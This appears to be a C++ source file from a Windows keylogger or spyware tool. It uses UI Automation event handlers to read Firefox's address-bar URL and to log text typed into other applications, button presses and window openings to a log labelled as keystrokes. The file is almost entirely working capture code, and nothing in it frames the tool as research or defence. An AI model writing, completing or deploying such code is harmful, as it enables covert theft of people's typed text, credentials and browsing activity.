#include "MyAutomationEventHandlerApps.h"
#include "MyAutomationEventHandler.h"
#include "Logger.h"
#include "MyTreeWalker.h"
#include "Helpers.h"

void MyAutomationEventHandler::HandleFirefox(IUIAutomationElement* pAutomationElement, const std::wstring& wsProcName, const std::wstring& wsEventString, const std::wstring& wsDate, EVENTID eventID)
{
	//Log(L"HandleFirefox() Invoked", DBG);

	BSTR bUrlBar = NULL;
	HRESULT hr = ERROR_SUCCESS;
	IUIAutomation* pAutomation = NULL;
	CComPtr<IUIAutomationElement> pAutomationElementUrlBar = NULL;
	CComPtr<IUIAutomationCondition> pCondition = NULL;
	VARIANT vAutomationId;
	VARIANT vUrlBar;
	VARIANT vValue;
	std::wstring wsDomain = L"";
	std::wstring wsUrl = L"";
	VariantInit(&vAutomationId);
	VariantInit(&vUrlBar);
	VariantInit(&vValue);

	switch (eventID) {
	case UIA_Text_TextSelectionChangedEventId:
	case UIA_Text_TextChangedEventId:
		pAutomation = g_pMyTreeWalker->GetPAutomation();
		if (pAutomation == NULL)
		{
			Log(L"Can't get pAutomation from g_pMyTreeWalker()", DBG);
			break;
		}

		vAutomationId.vt = VT_BSTR;
		vAutomationId.bstrVal = SysAllocString(L"urlbar-input");
		hr = pAutomation->CreatePropertyCondition(UIA_AutomationIdPropertyId, vAutomationId, &pCondition);
		if (FAILED(hr))
		{
			Log(L"Can't create property condition", DBG);
			break;
		}

		pAutomationElementUrlBar = g_pMyTreeWalker->FindFirstAscending(pAutomationElement, pCondition);
		if (pAutomationElementUrlBar == NULL)
		{
			Log(L"Can't find navigation bar of firefox!", DBG);
			break;
		}

		hr = pAutomationElementUrlBar->GetCurrentPropertyValue(UIA_ValueValuePropertyId, &vUrlBar);
		if (FAILED(hr))
		{
			Log(L"Can't get url value", WARNING);
			break;
		}

		wsUrl = std::wstring(vUrlBar.bstrVal);
		Log(L"URL: " + wsUrl, DBG);

		wsDomain = Helpers::GetDomainFromUrl(vUrlBar.bstrVal);

		break;

	default:
		Log(L"Arrived unknown event in HandleFirefox(). How to process that? :)" + wsEventString, DBG);
		break;
	}


	if (bUrlBar)
		SysFreeString(bUrlBar);

	VariantClear(&vValue);
	VariantClear(&vUrlBar);
	VariantClear(&vAutomationId);
}

void MyAutomationEventHandler::HandleChrome(IUIAutomationElement* pAutomationElement, const std::wstring& wsProcName, const std::wstring& wsEventString, const std::wstring& wsDate, EVENTID eventID)
{
	Log(L"HandleChrome() Invoked", DBG);
	Log(L"Todo :))", INFO);
}

void MyAutomationEventHandler::HandleExplorer(IUIAutomationElement* pAutomationElement, const std::wstring& wsProcName, const std::wstring& wsEventString, const std::wstring& wsDate, EVENTID eventID)
{
	Log(L"HandleExplorer() Invoked", DBG);
	Log(L"Todo :))", INFO);
}

void MyAutomationEventHandler::HandleOther(IUIAutomationElement* pAutomationElement, const std::wstring& wsProcName, const std::wstring& wsEventString, const std::wstring& wsDate, EVENTID eventID)
{
	//Log(L"HandleOther() Invoked", DBG);

	BSTR bWindowName = NULL;
	BSTR bClassName = NULL;
	BSTR bLocalizedControlType = NULL;

	DWORD size = 0;
	HRESULT hr = ERROR_SUCCESS;

	VARIANT vValue;
	VARIANT vHelp;
	VariantInit(&vValue);
	VariantInit(&vHelp);

	CComPtr<IUIAutomationElement> pAutomationElementChild = pAutomationElement;
	CComPtr<IUIAutomationElement> pAutomationElementParent = NULL;

	CONTROLTYPEID ctId;

	std::wstring wsControlType = L"";
	std::wstring wsLogKeyStroke = wsDate + L" " + wsProcName + L" [" + wsEventString + L"]";

	switch (eventID)
	{
	case UIA_Text_TextSelectionChangedEventId:
	case UIA_Text_TextChangedEventId:
		hr = g_pMyTreeWalker->GetFirstAscendingWindowName(pAutomationElement, &bWindowName);
		if (FAILED(hr))
		{
			Log(L"Can't get window name value", WARNING);
			break;
		}

		hr = pAutomationElement->get_CurrentClassName(&bClassName);
		if (FAILED(hr))
		{
			Log(L"Can't get current class name", DBG);
			break;
		}

		hr = pAutomationElement->GetCurrentPropertyValue(UIA_LegacyIAccessibleHelpPropertyId, &vHelp);
		if (FAILED(hr))
		{
			Log(L"Can't get help property value", DBG);
			break;
		}

		hr = pAutomationElement->GetCurrentPropertyValue(UIA_ValueValuePropertyId, &vValue);
		if (FAILED(hr))
		{
			Log(L"Can't get property value", WARNING);
			break;
		}

		wsLogKeyStroke += L"\n\tWindow: " + std::wstring(bWindowName);
		wsLogKeyStroke += L"\n\tClass: " + std::wstring(bClassName);
		wsLogKeyStroke += L"\n\tHelp: " + std::wstring(vHelp.bstrVal);
		wsLogKeyStroke += L"\n--------------[RAW CONTENT]--------------\n" + std::wstring(vValue.bstrVal) + L"\n--------------[RAW CONTENT]--------------";

		Log(wsLogKeyStroke, EMPTY);
		break;

	case UIA_Invoke_InvokedEventId:
		
		hr = pAutomationElement->get_CurrentName(&bWindowName);
		if (FAILED(hr))
		{
			Log(L"Can't get window name", DBG);
			break;
		}
		
		hr = pAutomationElement->get_CurrentClassName(&bClassName);
		if (FAILED(hr))
		{
			Log(L"Can't get current class name", DBG);
			break;
		}

		hr = pAutomationElement->GetCurrentPropertyValue(UIA_LegacyIAccessibleHelpPropertyId, &vHelp);
		if (FAILED(hr))
		{
			Log(L"Can't get help property value", DBG);
			break;
		}

		hr = pAutomationElement->get_CurrentControlType(&ctId);
		if (FAILED(hr))
		{
			Log(L"Can't get current control type", DBG);
			break;
		}

		wsControlType = Helpers::ControlTypeIdToString(ctId);

		hr = pAutomationElement->get_CurrentLocalizedControlType(&bLocalizedControlType);
		if (FAILED(hr))
		{
			Log(L"Can't get localized control type", DBG);
			break;
		}

		wsLogKeyStroke += L"\n--------------[User pressed the button]--------------";
		wsLogKeyStroke += L"\n\tControlType: " + std::wstring(wsControlType);
		wsLogKeyStroke += L"\n\tLocalizedControlType: " + std::wstring(bLocalizedControlType);
		wsLogKeyStroke += L"\n\tName: " + std::wstring(bWindowName);
		wsLogKeyStroke += L"\n\tHelp: " + std::wstring(vHelp.bstrVal);
		wsLogKeyStroke += L"\n--------------[User pressed the button]--------------";

		Log(wsLogKeyStroke, EMPTY);
		break;

	case UIA_Window_WindowOpenedEventId:
		hr = g_pMyTreeWalker->GetFirstAscendingWindowName(pAutomationElement, &bWindowName);
		if (FAILED(hr))
		{
			Log(L"Can't get window name value", WARNING);
			break;
		}

		hr = pAutomationElement->get_CurrentClassName(&bClassName);
		if (FAILED(hr))
		{
			Log(L"Can't get current class name", DBG);
			break;
		}

		wsLogKeyStroke += L"\n--------------[Opened new Window]--------------";
		wsLogKeyStroke += L"\n\tWindow: " + std::wstring(bWindowName);
		wsLogKeyStroke += L"\n\tClass: " + std::wstring(bClassName);
		wsLogKeyStroke += L"\n--------------[Opened new Window]--------------";

		Log(wsLogKeyStroke, EMPTY);
		break;

	default:
		Log(L"Arrived unknown event in HandleOther(). How to process that? :)" + wsEventString, DBG);
		break;
	}

	if (bLocalizedControlType)
		SysFreeString(bLocalizedControlType);

	if (bWindowName)
		SysFreeString(bWindowName);

	if (bClassName)
		SysFreeString(bClassName);

	VariantClear(&vHelp);
	VariantClear(&vValue);
}